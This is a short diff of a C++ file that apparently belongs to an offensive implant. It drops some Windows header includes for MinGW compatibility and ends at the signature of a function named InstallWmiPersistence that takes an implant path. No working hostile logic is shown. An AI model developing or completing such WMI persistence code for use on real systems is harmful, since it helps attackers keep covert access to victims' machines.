@@ -1,9 +1,6 @@
 #include "persistence.hpp"
 #include <windows.h>
 #include <wbemidl.h>
-#include <comdef.h>
-// MSVC-specific ATL header removed for MinGW compat
-#include <sddl.h>
 #include <string>
 
 BOOL InstallWmiPersistence(const wchar_t* implantPath) {
